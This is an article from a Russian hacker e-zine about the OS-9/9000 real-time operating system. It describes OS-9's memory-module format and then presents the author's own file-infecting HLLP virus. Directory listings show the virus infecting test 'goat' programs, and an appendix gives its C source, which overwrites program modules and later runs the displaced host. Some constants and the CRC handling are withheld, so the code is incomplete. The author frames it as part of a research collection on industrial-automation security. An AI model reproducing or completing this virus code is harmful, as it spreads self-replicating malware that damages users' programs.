▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓┌──────────────────────────────────────────────────────────────────────┐▓▓▓▓
▓▓▓│                                       ▄ ▄                            │░░▓▓
▓▓▓│ ▄██▄ ▄██▄  █ █  ▄▀▀▄ █  █ █  █ █▐▌█  ▄▄█▄▄ ▄██▄ █▀▀▄ █ █ █ ▄▀▀█ ▄▀▀█ │░░▓▓
▓▓▓│ ▄▄▄█ █▄▄▄ █ █ █ █    █  █ █  █ █  █  █ █ █ █▄▄▄ █  █ █ █ █ █  █ █  █ │░░▓▓
▓▓▓│ ▄▄▄█ █▄▄▄ █ █ █ █  ▄ █▄▀  █  █ █  █  █▄█▄█ █▄▄▄ █▀▀  ▀▄▀▄▀ █▄▄█ █  █ │░░▓▓
▓▓▓│  ▀▀   ▀▀  ▀ ▀ ▀  ▀▀  ▀ ▀▀  ▀▀▀  ▀▀▀    ▀    ▀▀  ▀     ▀ ▀  ▀  ▀ ▀  ▀ │░░▓▓
▓▓▓├──────────────────────────────────────────────────────────────────────┤░░▓▓
▓▓▓│                            В ы п у с к ∙5∙                           │░░▓▓
▓▓▓└──────────────────────────────────────────────────────────────────────┘░░▓▓
▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

                     ЧЕТЫРЕУС ДЛЯ ОСЬ МИНУС ДЕВЯТЬ
                               by DrMAD

    Просматривая 4-й  выпуск  электронного  журнала  x25  (посвященного
сетевым unix -технологиям), я вздрогнул, встретив знакомое наименование
операционной системы:  OS-9.  Дело в том,  что лет 7-8 назад я довольно
активно и серьезно прогал в этой системе,  потом  часто  сталкивался  с
необходимостью  работы  в  ней  года  примерно  до  2000,  и до сих пор
сохранил о ней самые романтичные воспоминания.  Я про нее  даже  книжку
написал /1/. :)
    Итак, вот что я увидел в этой статье (автор - madcr) :

    Что такое os9 ?  os9 является осью реального времени для  68xxx
    процессоров  созданная  непосредственно  компаниями microware и
    motorola в 1979 году.  Версия  которую  мы  рассмотрим  в  этой
    статье  -  os9  level  II,  в  нашем случае работающую на 68030
    процессоре.  В настоящее время  os9  переродилась  в  os9000  и
    работает  на  ppc  и  x86  процах,  но,  как я сказал выше,  мы
    рассмотрим более древнюю os9,  которая до сих пор  используется
    для  разных нужд...

    Все немножко совсем не так.  :-) OS-9 - действительно многозадачная
операционная   система   реального   времени   от   фирмы    Microware,
оптимизированная  для использования в системах автоматизации. Но это не
клон  UNIX!  Авторы  операционной  системы  обеспечили   лишь   внешнюю
похожесть  своей  системы  на  UNIX (иерархичность  файловой структуры,
названия системных утилит,  названия Си-шных функций в API и т.п.),  но
внутренняя архитектура у OS9 - своя, абсолютно оригинальная.
    Первоначально OS-9 была ориентирована на процессоры MC 68K,  но  на
рубеже  80-90-х  годов  появилась  разновидность под названием OS-9000,
ориентирванная  на  i80x86.  С  точки  зрения  юзера  или   прикладного
программиста  OS-9  и  OS-9000 - это одна и та же операционная система:
одинаковое поведение,  одинаковый внешний интерфейс (командная строка),
одинаковые   системные   утилиты,   одинаковое  распределение   памяти,
одинаковая  файловая  система,  одинаковые  исходные  тесты   программ.
Работая  в OS-9,  можно компилировать свои программы в машинный код для
OS-9000 и наоборот. Обычно программировать приходится на Си, мне больше
по  душе  простенький  "OS-9  C compiler",  хотя много лет уже основным
средством программирования считается мощный оптимизирующий  "OS-9 Ultra
C/C++  compiler".   Лет   5   назад   произошло  обратное  слияние, оба
варианта операционной системы снова носят название OS-9.
    OS-9/9000 -  конфигурируемая  система.  Это  очень   компактное   и
быстродействующее  ядро,  которое  можно  обвешать  минимальным набором
драйверов  и  закачать  через  RS-232  в  память  крохотного   дешевого
микроконтроллера. А можно завалить компиляторами, отладчиками, хелпами,
системными утилитами,  графической  оболочкой  X-Window  и  работать  в
полном комфорте, попивая чаек и попаривая ноги в тазике.
    Одна из интересных особенностей OS-9  -  поддержка  модулей  памяти
(memory  module).  Все  компоненты  операционной  системы  организуются
именно в виде модулей.
    Прикладная программа  -  это модуль.  Драйвер внешнего устройства -
это модуль. Дескриптор внешнего устройства (набор данных, не содержащий
кода,   а  только  ресурсы)  -  модуль.  Фрагмент  оперативной  памяти,
зафиксированный в ней постоянно и служащий  для  обмена  данными  между
процессами - тоже модуль.
    Структура модуля /2/:

                  +-----------------------------------+
                  | Заголовок:                        |
                  |  - сигнатура;                     |
                  |  - имя модуля;                    |
                  |  - длина модуля;                  |
                  |  - флаги дуступа;                 |
                  |  - тип содержимого;               |
                  |  - адреса фрагментов содержимого; |
                  |  - контрольная сумма заголовка;   |
                  |  - прочая служебная инфа.         |
                  +-----------------------------------+
                  |                                   |
                  |             Содержимое            |
                  |                                   |
                                   . . .
                  |                                   |
                  +-----------------------------------+
                  |           CRC содержимого         |
                  +-----------------------------------+

    Разумеется, еще  8  лет  назад  я  написал  несколько  вирусов  для
OS-9/9000! :-)
    Вот исходник одного из самых простых.  Это примитивный  HLLP-вирус,
он заражает все найденные программные модули в текущем каталоге данных.
Кстати,  в OS-9 поддерживаются два  РАЗНЫХ  текущих  каталога:  текущий
каталог  данных  и  текущий  каталог  исполняемых  программ.  Они могут
отображаться в одно и тоже место, а могут и в разные.
    Этот вирус "пожирает" свою  жертву:  помещает  ее  в  свою  область
глобальных данных, а при необходимости "отрыгивает" в файл со случайным
именем, запускает, а потом снова удаляет.
    Бинарник, конечно же,  не прилагается.  Его просто  не  осталось  в
природе, и  восстанавливать  его  у меня нет желания.  А скомпилировать
исходник, не  имея  OS-9/9000  и  моих советов, вам вряд ли удастся. По
крайней мере, как я обошелся с CRC - пусть останется моим ноу-хау. :)
    Впрочем, у меня полная и официальная версия, а вы можете залезть на 
http:\\www.microware.com  и  заказать себе бесплатный CD с демоверсиями 
компиляторов,  кросс-оболочек  и  возможностью сделать себе загрузочную 
дискетку OS-9.   

    Исходное состояние каталога:

 Owner    Last modified    Attributes     Block  Bytecount Name
-------   ------------- ---------------- ------- --------- ----
  0.0     79/12/31 1802 -------------ewr    3DA1      6020 goat
  0.0     79/12/31 1821 -------------ewr    3E3F     25978 virus

    После запуска вируса. Видно, что goat "поправился" на 19Кб:

 Owner    Last modified    Attributes     Block  Bytecount Name
-------   ------------- ---------------- ------- --------- ----
  0.0     79/12/31 1813 -------------ewr    3DA1     25978 goat
  0.0     79/12/31 1813 -------------ewr    3E3F     25978 virus

    Теперь копируем в каталог здоровенький goat2:

 Owner    Last modified    Attributes     Block  Bytecount Name
-------   ------------- ---------------- ------- --------- ----
  0.0     79/12/31 1813 -------------ewr    3DA1     25978 goat
  0.0     79/12/31 1802 -------------ewr    3DD3      6020 goat2
  0.0     79/12/31 1813 -------------ewr    3E3F     25978 virus

    И запускаем зараженный goat, теперь заражены все:

 Owner    Last modified    Attributes     Block  Bytecount Name
-------   ------------- ---------------- ------- --------- ----
  0.0     79/12/31 1814 -------------ewr    3DA1     25978 goat
  0.0     79/12/31 1814 -------------ewr    3DD3     25978 goat2
  0.0     79/12/31 1814 -------------ewr    3E3F     25978 virus

    Voila, жизнеспособнось вируса доказана!

    Собственно говоря,  этот  вирус  -  один  из экспонатов моей личной
коллекции вирусов, работающих в самых экзотических программно-аппаратных
средах.  Эта  коллекция  изредка  пополняется  и служит фактологической
основой  для  довольно  серьезных  исследований,  посвященных  вопросам
безопасности  в  системах промышленной автоматизации.  По крайней мере,
пара "бумажных" статей в разных  сборниках  на  эту  тему  у  меня  уже
имеется.
    Поэтому прошу 273-ю статью на меня не катить! :)

    ЛИТЕРАТУРА

    1. Баландин  А.В.,  Климентьев  К.Е.  Устройство и функционирование
операционной системы реального времени OS-9/9000. / Самара: Университет
Наяновой, 1996. - 101 с.
    2. OS-9000 Technical Manual. Version 2.2.

    ПРИЛОЖЕНИЕ. Исходник вируса (даже не пытайтесь компилировать !!!).

/* Simple virus for OS-9/9000, (c) 1996 */
#include <stdio.h>
#include <dir.h>
#include <modes.h>
#include <time.h>
#include <module.h>
#include <reg386.h>

#define MAXLEN  ?????
#define SELFLEN ?????
#define GOATPOS ?????

DIR *d;
mh_com *m;
struct direct *de;
char *selfname;
char rndname[9];
int  f, f2;
time_t t;
unsigned char *buf, *buf2;
int  q, q1, q2;
int  i, j;
char fstr[]={"??????????????????????"};
char dstr[]={"??????????????????????"};
unsigned char buf1[MAXLEN]={"???????"}; /* Here's the goat file */

void infect(s) char *s;
  {
  if (s[0]=='.') return;

  if ((f = open(s, S_IREAD|S_IWRITE))==-1) return;
  if ((q = read(f, buf, MAXLEN))==MAXLEN) return;
  if ((m->m_sync!=0x4AFC)&&(m->m_sync!=0x4AFD)) { close(f); return; }
  if ((buf[0x50]=='v')&&
      (buf[0x51]=='i')&&
      (buf[0x52]=='r')&&
      (buf[0x53]=='u')&&
      (buf[0x54]=='s'))  { close(f); return; }
  lseek(f, 0, 0);
  if ((q1 = write(f, buf2, SELFLEN))==-1) { close(f); return; }
  lseek(f, GOATPOS, 0);
  if ((q1 = write(f, buf, q))==-1) { close(f); return; }
  close(f);

  i=0; while (s[i]) fstr[i+10]=s[i++]; fstr[i+11]='\0';
  system(fstr);
  }

main(argn, args) int argn; char *args[];
  {
   selfname = args[0];
   if ((m = (mh_com *) (buf = (unsigned char *) malloc(MAXLEN)))==NULL) return 1;
   if ((buf2 = (unsigned char *) malloc(SELFLEN))==NULL) return 2;
   if ((d = opendir("."))==NULL) return 3;

   if ((f2 = open(selfname, S_IREAD))==-1) return 4;
   if ((q2 = read(f2, buf2, SELFLEN))==-1) { close(f2); return 5; };
   close(f2);
   rewinddir(d);
   while ((de = readdir(d)) != NULL) infect(de->d_name);
   free(buf); free(buf2);

   m = (mh_com *) buf1;
   if ((m->m_sync==0x4AFC)||(m->m_sync==0x4AFD)) /* Is here goat? */
    {
      time(&t);
      for (i=0;i<8;i++)
       {
        rndname[i] = 'a' + t%27;
        t = t/2;
       }
      rndname[8]='\0';
      if ((f2 = create(rndname,
                       S_IREAD|S_IWRITE,
                       S_IREAD|S_IWRITE|S_IEXEC))==-1) return 6;
      if ((q2==write(f2, buf1, m->m_size ))==-1) { close(f2); return 7; };
      close(f2);

      os9fork( rndname, "", 0, 40000, 0, 0, 0 );
      wait(0);

      i=0; while (rndname[i]) dstr[i+4]=rndname[i++]; dstr[i+5]='\0';
      system(dstr);
    }

  }
